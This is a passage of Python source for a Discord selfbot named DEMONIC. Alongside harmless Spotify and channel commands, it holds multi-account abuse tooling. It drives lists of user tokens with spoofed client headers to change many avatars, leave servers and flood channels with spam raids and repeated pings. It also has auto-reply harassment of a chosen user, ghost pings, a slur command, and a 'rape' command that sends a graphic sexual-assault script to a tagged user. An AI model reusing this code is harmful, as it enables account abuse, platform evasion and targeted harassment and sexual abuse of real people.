                await ctx.send("```Usage: .spotify addqueue <song name> to add a song to the queue.```")

        elif action.lower() == "repeat":
            if args and args[0].lower() in ['track', 'context', 'off']:
                state = args[0].lower()
                if state == "track":
                    spotify_client.repeat("track")
                    await ctx.send("```Repeat mode set to track.```")
                elif state == "context":
                    spotify_client.repeat("context")
                    await ctx.send("```Repeat mode set to context.```")
                else:
                    spotify_client.repeat("off")
                    await ctx.send("```Repeat mode turned off.```")
            else:
                await ctx.send("```Usage: .spotify repeat <track/context/off> to set the repeat mode.```")

        else:
            await ctx.send("```Invalid action. Use .spotify <unpause/pause/next/prev/volume/current/play/shuffle/addqueue/repeat>```")

    except spotipy.SpotifyException as e:
        await ctx.send(f"```Error controlling Spotify: {e}```")
        
@bot.command()
@require_password()
async def createchannel(ctx, name: str = "DEMONIC  selfbot"):
    if ctx.author.guild_permissions.manage_channels:
        await ctx.guild.create_text_channel(name)
        await ctx.send(f"```channel '{name}' created.```")
    else:
        await ctx.send("```You don't have permission to create text channels.```")

@bot.command()
@require_password()
async def createvc(ctx, name: str = "DEMONIC selfbot VC"):
    if ctx.author.guild_permissions.manage_channels:
        await ctx.guild.create_voice_channel(name)
        await ctx.send(f"```voice channel '{name}' created.```")
    else:
        await ctx.send("```You don't have permission to create voice channels.```")

@bot.command()
@require_password()
async def createrole(ctx, *, name: str = "DEMONIC selfbot role"):
    guild = ctx.guild
    try:
        role = await guild.create_role(name=name)
        await ctx.send(f"```Role '{role.name}' has been created successfully.```")
    except discord.Forbidden:
        await ctx.send("```You don't have the required permissions to create a role.```")
    except discord.HTTPException as e:
        await ctx.send(f"```An error occurred: {e}```")
        
        
@bot.command()
@require_password()
async def ghostping(ctx, user: discord.User):

    try:

        message = await ctx.send(f"{user.mention}")
        await message.delete()  
        await ctx.message.delete()  

    except Exception as e:
        await ctx.send(f"```Failed: {e}```")

typing_active = {}  

@bot.command()
@require_password()
async def triggertyping(ctx, time: str, channel: discord.TextChannel = None):

    
    if channel is None:
        channel = ctx.channel

    total_seconds = 0


    try:
        if time.endswith('s'):
            total_seconds = int(time[:-1]) 
        elif time.endswith('m'):
            total_seconds = int(time[:-1]) * 60  
        elif time.endswith('h'):
            total_seconds = int(time[:-1]) * 3600  
        else:
            total_seconds = int(time)  
    except ValueError:
        await ctx.send("Please provide a valid time format (e.g., 5s, 2m, 1h).")
        return

   
    typing_active[channel.id] = True

    try:
        async with channel.typing():
            await ctx.send(f"```Triggered typing for {total_seconds}```")
            await asyncio.sleep(total_seconds)  
    except Exception as e:
        await ctx.send("```Failed to trigger typing```")
    finally:
        typing_active.pop(channel.id, None)

@bot.command()
@require_password()
async def triggertypingoff(ctx, channel: discord.TextChannel = None):

    
    if channel is None:
        channel = ctx.channel

    if channel.id in typing_active:
        typing_active.pop(channel.id)  
        await ctx.send(f"```Stopped typing in {channel.name}.```")
    else:
        await ctx.send(f"```No typing session is active```")

@bot.command()
@require_password()
async def nickname(ctx, *, new_nickname: str):
    
    if ctx.guild:
        try:
            
            await ctx.guild.me.edit(nick=new_nickname)
            await ctx.send(f'```Nickname changed to: {new_nickname}```')
        except discord.Forbidden:
            await ctx.send('```Cannot change nickname```')
    else:
        await ctx.send('```This command can only be used in a server.```')
        
@bot.command()
@require_password()
async def autoreact(ctx, user: discord.User, emoji: str):
    autoreact_users[user.id] = emoji
    await ctx.send(f"```Now auto-reacting with {emoji} to {user.name}'s messages```")

@bot.command()
@require_password()
async def autoreactoff(ctx, user: discord.User):
    if user.id in autoreact_users:
        del autoreact_users[user.id]
        await ctx.send(f"```Stopped auto-reacting to {user.name}'s messages```")
    else:
        await ctx.send("```This user doesn't have autoreact enabled```")
@bot.command()
@require_password()
async def purge(ctx, num: int = None):
    """Purges a specified number of messages, including old ones, in DMs and Group Chats."""

    # Check if the command is used in DMs or a Group Chat
    if isinstance(ctx.channel, discord.DMChannel) or isinstance(ctx.channel, discord.GroupChannel):

        if num is not None and num < 1:
            await ctx.send("Please specify a number greater than 0.")
            return

        deleted_count = 0  # Track how many messages have been deleted

        # If num is None, delete as many messages as possible with a 0.5-second delay
        if num is None:
            # Fetch all messages in the channel (limit to 1000 to avoid overload)
            async for message in ctx.channel.history(limit=1000):
                try:
                    # Check if the message is sent by the user (bot/self-bot), skip if not
                    if message.author == lxc.user or message.author == ctx.author:
                        await message.delete()
                        deleted_count += 1
                        await asyncio.sleep(0.01)  # 0.5 seconds delay between each delete
                except discord.Forbidden:
                    await ctx.send("I don't have permission to delete messages here.")
                    return
                except discord.HTTPException:
                    # Stop if we hit rate limits or any other errors
                    await ctx.send(f"Stopped after deleting {deleted_count} messages due to an error.")
                    return

        else:
            # Fetch the specified number of messages
            async for message in ctx.channel.history(limit=num):
                try:
                    # Only delete messages from the bot/user, skip others
                    if message.author == bot.user or message.author == ctx.author:
                        await message.delete()
                        deleted_count += 1
                        await asyncio.sleep(0.05)  # 0.5 seconds delay between each delete
                except discord.Forbidden:
                    await ctx.send("I don't have permission to delete messages here.")
                    return
                except discord.HTTPException:
                    # Stop if we hit rate limits or any other errors
                    await ctx.send(f"Stopped after deleting {deleted_count} messages due to an error.")
                    return

        # Inform the user about the successful deletion
        await ctx.send(f"Successfully deleted {deleted_count} message(s).")

    else:
        await ctx.send("This command can only be used in DMs or Group Chats.")

def loads_tokens(file_path='tokens2.txt'):
    with open(file_path, 'r') as file:
        tokens = file.readlines()
    return [token.strip() for token in tokens if token.strip()]
       
@bot.command()
@require_password()
async def tpfp(ctx, url: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```
Token PFP Changer
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        if url is None:
            await status_msg.edit(content="```Please provide an image URL```")
            return

        success = 0
        failed = 0
        ratelimited = 0
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as img_response:
                if img_response.status != 200:
                    await status_msg.edit(content="```Failed to fetch image```")
                    return
                image_data = await img_response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = img_response.headers.get('Content-Type', '')
                if 'gif' in content_type.lower():
                    image_format = 'gif'
                else:
                    image_format = 'png'

            for i, token in enumerate(selected_tokens, 1):
                headers = {
                    "authority": "discord.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": bot.http.token,
                    "content-type": "application/json",
                    "origin": "https://discord.com",
                    "referer": "https://discord.com/channels/@me",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
                    "x-debug-options": "bugReporterEnabled",
                    "x-discord-locale": "en-US",
                    "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                
                payload = {
                    "avatar": f"data:image/{image_format};base64,{image_b64}"
                }
                
                try:
                    async with session.get(
                        'https://discord.com/api/v9/users/@me',
                        headers=headers
                    ) as verify_resp:
                        if verify_resp.status != 200:
                            failed += 1
                            print(f"Invalid token {i}")
                            continue

                    async with session.patch(
                        'https://discord.com/api/v9/users/@me',
                        headers=headers,
                        json=payload
                    ) as resp:
                        response_data = await resp.json()
                        
                        if resp.status == 200:
                            success += 1
                        elif "captcha_key" in response_data:
                            failed += 1
                            print(f"Captcha required for token {i}")
                        elif "AVATAR_RATE_LIMIT" in str(response_data):
                            ratelimited += 1
                            print(f"Rate limited for token {i}, waiting 30 seconds")
                            await asyncio.sleep(30)  
                            i -= 1  
                            continue
                        else:
                            failed += 1
                            print(f"Failed to update token {i}: {response_data}")
                        
                        progress = f"""```xml
Changing Profile Pictures...
Progress: < {i}/{len(selected_tokens)} > ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Failed: {failed}
Rate Limited: {ratelimited}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(2)  
                        
                except Exception as e:
                    failed += 1
                    print(f"Error with token {i}: {str(e)}")
                    continue

        await status_msg.edit(content=f"""```xml
Profile Picture Change Completed
Successfully changed: < {success}/{len(selected_tokens)} > avatars
Failed: {failed}
Rate Limited: {ratelimited}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def tleave(ctx, server_id: str = None):
    if not server_id:
        await ctx.send("```Please provide a server ID```")
        return
        
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
\u001b[0;36mToken Server Leave\u001b[0m
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        success = 0
        failed = 0
        ratelimited = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                headers = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'en-US,en;q=0.7',
                    'authorization': token,
                    'content-type': 'application/json',
                    'origin': 'https://discord.com',
                    'referer': 'https://discord.com/channels/@me',
                    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-discord-timezone': 'America/New_York',
                    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3NlYXJjaC5icmF2ZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6InNlYXJjaC5icmF2ZS5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJkaXNjb3JkLmNvbSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM0NzY5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
                }
                
                try:

                    async with session.delete(
                        f'https://discord.com/api/v9/users/@me/guilds/{server_id}',
                        headers=headers,
                        json={"lurking": False}  
                    ) as resp:
                        response_data = await resp.text()
                        
                        if resp.status in [204, 200]:  
                            success += 1
                        elif resp.status == 429:  
                            ratelimited += 1
                            retry_after = float((await resp.json()).get('retry_after', 5))
                            print(f"Rate limited for token {i}, waiting {retry_after} seconds")
                            await asyncio.sleep(retry_after)
                            i -= 1  
                            continue
                        else:
                            failed += 1
                            print(f"Failed to leave server with token {i}: {response_data}")
                        
                        progress = f"""```ansi
\u001b[0;36mLeaving Server...\u001b[0m
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Failed: {failed}
Rate Limited: {ratelimited}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(1)   
                        
                except Exception as e:
                    failed += 1
                    print(f"Error with token {i}: {str(e)}")
                    continue

        await status_msg.edit(content=f"""```ansi
\u001b[0;32mServer Leave Complete\u001b[0m
Successfully left: {success}/{len(selected_tokens)}
Failed: {failed}
Rate Limited: {ratelimited}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")
        
        
send_messages = {}
current_modes = {}  # Store current modes for each token
message_count = {}  # Count of messages sent per token
jokes1 = []  # Load jokes from mjokes.txt
image_links = {}  # Dictionary to store image links for each token
user_react_dict = {}  # Dictionary to store user IDs to ping for each token

# Load jokes from mjokes.txt
def load_jokes():
    with open('mjokes.txt', 'r') as file:
        jokes = file.readlines()
    return [joke.strip() for joke in jokes]

jokes1 = load_jokes()

def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file and return them as a list."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

def get_token_by_position(position):
    """Retrieve a token by its position from the tokens list, adjusted for 1-based indexing."""
    tokens = read_tokens()
    # Adjust for 1-based position by subtracting 1 from the input
    if 1 <= position <= len(tokens):
        return tokens[position - 1]
    return None

class MessageBot(discord.Client):
    def __init__(self, token, channel_id, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.channel_id = channel_id
        self.position = position

    async def on_ready(self):
        print(f'Logged in as {self.user} using token {self.token[-4:]}.')
        await self.send_messages()

    async def send_messages(self):
        global message_count
        channel = self.get_channel(self.channel_id) or await self.fetch_channel(self.channel_id)

        while send_messages.get(self.position, False):
            message_count[self.position] = message_count.get(self.position, 0) + 1

            # Check if message count exceeds 7
            if message_count[self.position] > 7:
                current_modes[self.position] = 2  # Switch to mode 2 for 10 seconds
                await asyncio.sleep(10)  # Wait for 10 seconds
                current_modes[self.position] = 7  # Revert back to mode 7
                message_count[self.position] = 0  # Reset message count

            # Select a random joke
            joke = random.choice(jokes1)
            words = joke.split()
            ping_user = user_react_dict.get(self.position, None)  # Get the user ID to ping

            await self.simulate_typing(channel)

            mode = current_modes.get(self.position, 1)  # Default to mode 1 if not set

            if mode == 1:  # Mode 1: Randomly sends 1 or 2 words at a time
                i = 0
                while i < len(words):
                    if i < len(words) - 1 and random.random() < 0.5:
                        # Send two words
                        msg = words[i] + " " + words[i + 1]
                        i += 2
                    else:
                        # Send one word
                        msg = words[i]
                        i += 1

                    await channel.send(msg)
                    await self.maybe_ping_user(channel, ping_user)
                    await asyncio.sleep(random.uniform(0.9, 1.4))  # Adjusted delay

            elif mode == 2:  # Mode 2: Sends the whole joke as a sentence
                await channel.send(joke)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5))

            elif mode == 3:  # Mode 3: Sends each word on a new line
                new_line_msg = '\n'.join(words)
                await channel.send(new_line_msg)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5) + 0.1)

            elif mode == 4:  # Mode 4: Header format
                header_msg = f"# {joke}"
                await channel.send(header_msg)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5) + 0.5)

            elif mode == 5:  # Mode 5: > # format
                header_msg = f"> # {joke}"
                await channel.send(header_msg)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5) + 0.5)

            elif mode == 6:  # Mode 6: More configurations as needed
                await channel.send(joke)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5))

            elif mode == 7:  # Mode 7: Combination of modes 1, 2, and 3
                format_choice = random.randint(1, 3)
                if format_choice == 1:  # Mode 1
                    i = 0
                    while i < len(words):
                        if i < len(words) - 1 and random.random() < 0.5:
                            msg = words[i] + " " + words[i + 1]
                            i += 2
                        else:
                            msg = words[i]
                            i += 1

                        await channel.send(msg)

                elif format_choice == 2:  # Mode 2
                    await channel.send(joke)

                elif format_choice == 3:  # Mode 3
                    new_line_msg = '\n'.join(words)
                    await channel.send(new_line_msg)

    async def maybe_ping_user(self, channel, user_id):
        """Ping the user with 100% chance."""
        if user_id:
            await channel.send(f"<@{user_id}>")

    async def simulate_typing(self, channel):
        """Simulate typing before sending a message."""
        async with channel.typing():
            await asyncio.sleep(random.uniform(1, 3))  # Simulate typing for a random time    
    




@bot.command()
@require_password()
async def ma(ctx, channel_id: int):
    """Start sending messages using all tokens in the specified channel simultaneously."""
    global send_messages
    tokens = read_tokens()
    tasks = []

    for position, token in enumerate(tokens):
        send_messages[position] = True  # Ensure message sending is allowed for the specified token
        message_count[position] = 0  # Reset message count for this token
        current_modes[position] = 1  # Default to mode 1 for this token

        client = MessageBot(token, channel_id, position)
        tasks.append(client.start(token, bot=False))  # Create a task for each token

    await asyncio.gather(*tasks)  # Start all tasks simultaneously

@bot.command()
@require_password()
async def mae(ctx):
    """Stop sending messages for all tokens."""
    global send_messages
    for position in send_messages.keys():
        send_messages[position] = False  # Disable sending messages for each token
    await ctx.send("Stopped all tokens from sending messages.")
@bot.command()
@require_password()
async def mp(ctx, position: int, user_id: int):
    """Set the user ID to ping at the end of the messages for the specified token."""
    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        user_react_dict[position - 1] = user_id  # Set user ID to ping for the specified token
        await ctx.send(f"Will ping user <@{user_id}> at the end of messages sent by token at position {position}.")
    else:
        await ctx.send("Invalid position! Please provide a position between 1 and the number of tokens.")
@bot.command()
@require_password()
async def mpa(ctx, user_id: int):
    """Set all tokens to ping the specified user ID."""
    for position in range(len(send_messages)):
        token = get_token_by_position(position)  # Adjusted for 1-based index
        if token:
            user_react_dict[position] = user_id  # Set user ID to ping for all tokens
    await ctx.send(f"All tokens will now ping user <@{user_id}> at the end of messages.")


@bot.command()
@require_password()
async def mma(ctx, mode: int):
    """Change the mode for all tokens."""
    global current_modes
    if mode in range(1, 8):  # Ensure the mode is between 1 and 7
        for position in range(len(current_modes)):  # Iterate through all tokens
            current_modes[position] = mode  # Set the mode for each token
        await ctx.send(f"All tokens have been set to mode {mode}.")
    else:
        await ctx.send("Invalid mode! Please enter a mode between 1 and 7.")  
@bot.command()
@require_password()
async def mm(ctx, position: int, mode: int):
    """Change the mode of the token at the specified position."""
    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        if 1 <= mode <= 7:  # Ensure the mode is between 1 and 7
            current_modes[position - 1] = mode  # Adjust for 1-based index
            await ctx.send(f"Mode for token at position {position} changed to {mode}.")
        else:
            await ctx.send("Invalid mode! Please enter a mode between 1 and 7.")
    else:
        await ctx.send("Invalid position! Please provide a position between 1 and the number of tokens.")        
@bot.command()
@require_password()
async def m(ctx, channel_id: int, position: int):
    """Start sending messages using the token at the specified position in the given channel."""
    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        channel = await bot.fetch_channel(channel_id)  # Fetch the channel by ID
        send_messages[position - 1] = True  # Enable message sending for the specified token
        message_count[position - 1] = 0  # Reset message count for this token
        current_modes[position - 1] = 1  # Default to mode 1 for this token

        client = MessageBot(token, channel_id, position - 1)
        await client.start(token, bot=False)
    else:
        await ctx.send(f"No token found at position {position}.")      
@bot.command()
@require_password()
async def me(ctx, position: int):
    """Stop sending messages using the token at the specified position."""
    token = get_token_by_position(position - 1)  # Adjusted for 1-based index, as you requested
    if token:
        send_messages[position - 1] = False  # Stop message sending for the specified token
        await ctx.send(f"Stopped sending messages for token at position {position}.")
    else:
        await ctx.send("Invalid position! Please provide a position between 1 and the number of tokens.")       

@bot.command()
@require_password()
async def cap(ctx):
    global auto_capitalism
    await ctx.message.delete()
    auto_capitalism = not auto_capitalism
    await ctx.send(f'Auto capitalism is now {"on" if auto_capitalism else "off"}.', delete_after=5) 
    
@bot.command()
@require_password()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"exeter_tweet.png"))
            except:
                await ctx.send(res['message'])  
                    
@bot.command()
@require_password()
async def retard(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% retarded. good luck with life with a extra chromosone 😭")

active_clients_1 = {}
current_mode_1 = {}
user_to_reply = {}
replying = {}
last_message_time = {}
mode_6_active = {}
last_mode_6_response_time = {}

class AutoReplyClient(discord.Client):
    def __init__(self, token, user_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.user_id = user_id
        self.running = True

    async def on_ready(self):
        print(f'Logged in as {self.user}')

    async def on_message(self, message):
        if message.author.id == self.user_id and not message.author.bot:  # Check if the message is from the user to reply to
            current_time = time.time()
            reply_mode = current_mode_1.get(self.token, 1)  # Default to mode 1 if not set

            # Mode 6 Logic
            if mode_6_active.get(self.token, False):
                # Only respond if 1.5 seconds have passed since the last response to this user
                if message.author.id not in last_mode_6_response_time or (current_time - last_mode_6_response_time[message.author.id] > 1.5):
                    last_mode_6_response_time[message.author.id] = current_time  # Update the last response time
                    await asyncio.sleep(1.5)  # Simulate typing
                    reply_text = random.choice(load_jokes())  # Choose a joke to reply with
                    await message.reply(reply_text)  # Direct reply
                    return  # Exit to prevent processing further messages

            # Update last message time for other modes
            last_message_time[message.id] = current_time

            if reply_mode == 1:
                reply_text = random.choice(load_jokes())  # Normal reply
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 2:
                joke = random.choice(load_jokes())
                reply_text = "\n" * 100  # 100 empty lines
                reply_text = reply_text.join(joke.split())  # Insert 100 empty lines between words
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 3:
                reply_text = "\n".join([f"# {word.strip() * 100}" for word in random.choice(load_jokes()).split()])  # Bold reply
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 4:
                reply_text = random.choice(load_jokes())  # Just send the joke normally
                await asyncio.sleep(1.5)  # Simulate typing
                await message.reply(reply_text)  # Direct reply
            elif reply_mode == 5:
                reply_text = random.choice(load_jokes())  # Send a joke with a ping
                await message.channel.send(f"{reply_text} {message.author.mention}")  # Send with a ping

    def stop_replying(self):
        self.running = False

def load_jokes():
    # Load jokes from jokes.txt
    with open("jokes.txt", "r") as f:
        return f.read().splitlines()  # Return the jokes as a list

@bot.command()
@require_password()
async def ar(ctx, user_id: int, position: int):
    global active_clients_1, current_mode_1, replying

    # Read tokens from tokens2.txt
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Check if the position is valid
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Get the specified token
    token = tokens[position - 1]  # Adjust for zero-based index

    # Stop any existing client for this token if it's already running
    if token in active_clients_1:
        active_clients_1[token].stop_replying()
        await active_clients_1[token].close()

    # Start the AutoReplyClient for the specified token
    client = AutoReplyClient(token, user_id)
    active_clients_1[token] = client  # Keep track of the active client
    current_mode_1[token] = 1  # Default mode to 1
    user_to_reply[token] = user_id  # Set the user ID to reply to
    replying[token] = True  # Mark as replying
    await client.start(token, bot=False)  # Start the client
    await ctx.send(f'Started auto replying to user <@{user_id}> using token at position {position}.')

@bot.command()
@require_password()
async def are(ctx, position: int):
    global active_clients_1

    # Read tokens from tokens2.txt to maintain the original token order
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Check if the position is valid
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Get the specified token
    token = tokens[position - 1]  # Get the token at the specified position

    # Stop the active client for the specified token
    if token in active_clients_1:
        active_clients_1[token].stop_replying()
        await active_clients_1[token].close()
        del active_clients_1[token]  # Remove from active clients
        await ctx.send(f'Stopped auto replying for token at position {position}.')
    else:
        await ctx.send("No active client found for this token.")

@bot.command()
@require_password()
async def am(ctx, position: int, mode: int):
    global active_clients_1, current_mode_1

    # Read tokens from tokens2.txt to maintain the original token order
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # Check if the position is valid
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Get the specified token
    token = tokens[position - 1]  # Get the token at the specified position

    # Check if the token is active
    if token in active_clients_1:
        current_mode_1[token] = mode  # Set the new mode for the specified token
        await ctx.send(f'Changed mode for token at position {position} to {mode}.')
    else:
        await ctx.send("No active client found for this token.")


@bot.command()
@require_password()
async def ara(ctx, user_id: int):
    global active_clients_1

    # Read tokens from tokens2.txt
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()

    # List to hold all the client tasks
    client_tasks = []

    # Log in with every token and start responding to the specified user
    for token in tokens:
        if token not in active_clients_1:  # Check if the client is already running for this token
            client = AutoReplyClient(token, user_id)  # Create a new client instance for auto-replies
            active_clients_1[token] = client  # Keep track of the active client
            client_tasks.append(client.start(token, bot=False))  # Add the start task to the list
        else:
            active_clients_1[token].replying = True  # Ensure it's set to reply

    # Wait for all client tasks to complete
    await asyncio.gather(*client_tasks)

    await ctx.send(f'All tokens are now replying to <@{user_id}>.')
@bot.command()
@require_password()
async def arae(ctx):
    global active_clients_1

    # Stop all active clients
    for token in list(active_clients_1.keys()):
        active_clients_1[token].stop_replying()
        await active_clients_1[token].close()
    active_clients_1.clear()  # Clear the active clients list
    await ctx.send("Stopped auto replying for all tokens.")

@bot.command()
@require_password()
async def ama(ctx, mode: int):
    global active_clients_1

    # Check if the provided mode is valid (you can customize the range based on your modes)
    if mode < 1 or mode > 5:  # Assuming you have 5 modes
        await ctx.send("Invalid mode. Please provide a mode between 1 and 5.")
        return

    # Update the mode for each active client
    for token, client in active_clients_1.items():
        client.reply_mode = mode  # Set the mode for the token's client

    await ctx.send(f'All tokens have been set to mode {mode}.')








user_react_dict = {}
active_clients_x = {}


def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file and return them as a list."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

def get_token_by_position(position):
    """Retrieve a token by its position from the tokens list."""
    tokens = read_tokens()
    if 0 <= position < len(tokens):
        return tokens[position]
    return None

class MultiToken3(discord.Client):
    def __init__(self, token, user_id, emoji, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.user_id = user_id
        self.emoji = emoji
        self.position = position

    async def on_ready(self):
        print(f'Logged in as {self.user} using token {self.token[-4:]}.')

    async def on_message(self, message):
        if message.author.id == self.user_id:
            try:
                await message.add_reaction(self.emoji)
            except discord.Forbidden:
                print(f"Missing permissions to react to messages.")
            except discord.HTTPException as e:
                print(f"Failed to add reaction: {e}")

    async def close(self):
        await super().close()
        active_clients_x.pop(self.position, None)  # Remove client from active_clients_x    


@bot.command()
@require_password()
async def rape(ctx, user: discord.User):
    await ctx.message.delete()
    await ctx.send(f"Hey cutie kitten {user.mention}")  
    await ctx.send('my dearest kitten')
    await ctx.send('you have been running from ur daddy for too long.')
    await ctx.send('*slowly whips large meat out*')
    await ctx.send('get down on ur little knees my princess, daddy is mad.')
    await ctx.send('shhhh *puts fingers in mouth*')
    await ctx.send('*slowly pulls kittens pants down*')
    await ctx.send('are u ready for this big load my kitten?')
    await ctx.send('*puts fingers inside kittens tight little pussy')
    await ctx.send('mmm u like that right?')
    await ctx.send('moan for ur daddy')
    await ctx.send('good little princess')
    await ctx.send('*puts dick inside kittens ass*')
    await ctx.send('oops wrong hole i guess ill just keep it in there')
    await ctx.send('*keeps going while fingering kittens tight pussy*')
    await ctx.send('oh yeaa cum for your daddy')
    await ctx.send('wdym no? ARE U DISOBEYING DADDY?')
    await ctx.send('*starts pounding harder and rougher*')
    await ctx.send('yea thats what u get')
    await ctx.send('*sees blood coming out*')
